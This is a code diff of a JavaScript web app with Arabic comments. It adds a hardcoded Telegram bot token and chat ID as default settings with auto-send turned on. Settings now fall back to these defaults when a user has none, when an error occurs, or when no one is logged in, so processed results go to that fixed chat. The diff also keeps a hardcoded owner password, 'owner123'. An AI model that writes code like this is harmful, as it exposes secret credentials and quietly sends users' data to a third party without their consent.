@@ -14,7 +14,14 @@ let isProcessingCode = false; // Prevent simultaneous code processing
 let pauseTimeout = null; // For managing pause timeout
 
 // Owner Settings
-const OWNER_PASSWORD = "owner123"; // يمكن تغييرها لاحقاً
+const OWNER_PASSWORD = "owner123";
+
+// Default Telegram Settings (يمكن تخصيصها من خلال إعدادات المستخدم)
+const DEFAULT_TELEGRAM_SETTINGS = {
+    botToken: "7668051564:AAFdFqSd0CKrlSOyPKyFwf-xHi791lcsC_U",
+    chatId: "-1002439956600",
+    autoSend: true
+}; // يمكن تغييرها لاحقاً
 
 // DOM Elements
 const loginSection = document.getElementById('loginSection');
@@ -2589,12 +2596,21 @@ async function loadSettingsToModal() {
     if (!currentUser) return;
     
     try {
-        const settings = await loadAllSettings();
+        const settings = await getSettings(); // استخدام getSettings التي تدمج مع الافتراضية
         botToken.value = settings.botToken || '';
         chatId.value = settings.chatId || '';
-        autoSend.checked = settings.autoSend === 'true';
+        autoSend.checked = settings.autoSend === true;
+        
+        // إظهار رسالة إذا كانت الإعدادات افتراضية
+        if (!await loadAllSettings().then(s => s.botToken)) {
+            showAlert('تم تحميل الإعدادات الافتراضية للتليجرام', 'info');
+        }
     } catch (error) {
         console.error('Error loading settings:', error);
+        // في حالة الخطأ، استخدم الإعدادات الافتراضية
+        botToken.value = DEFAULT_TELEGRAM_SETTINGS.botToken;
+        chatId.value = DEFAULT_TELEGRAM_SETTINGS.chatId;
+        autoSend.checked = DEFAULT_TELEGRAM_SETTINGS.autoSend;
     }
 }
 
@@ -2618,13 +2634,20 @@ async function saveSettingsData() {
 }
 
 async function getSettings() {
-    if (!currentUser) return {};
+    if (!currentUser) return DEFAULT_TELEGRAM_SETTINGS;
     
     try {
-        return await loadAllSettings();
+        const settings = await loadAllSettings();
+        
+        // Merge with defaults if settings are empty or missing
+        return {
+            botToken: settings.botToken || DEFAULT_TELEGRAM_SETTINGS.botToken,
+            chatId: settings.chatId || DEFAULT_TELEGRAM_SETTINGS.chatId,
+            autoSend: settings.autoSend === 'true' || (settings.autoSend === undefined && DEFAULT_TELEGRAM_SETTINGS.autoSend)
+        };
     } catch (error) {
         console.error('Error getting settings:', error);
-        return {};
+        return DEFAULT_TELEGRAM_SETTINGS;
     }
 }
 
@@ -2677,7 +2700,7 @@ async function testTelegramConnection() {
 }
 
 async function sendToTelegram(result, isRetry = false) {
-    const settings = getSettings();
+    const settings = await getSettings();
     
     if (!settings.botToken || !settings.chatId) {
         updateTelegramStatus(result.id, 'failed', 'إعدادات التليجرام غير مكتملة');
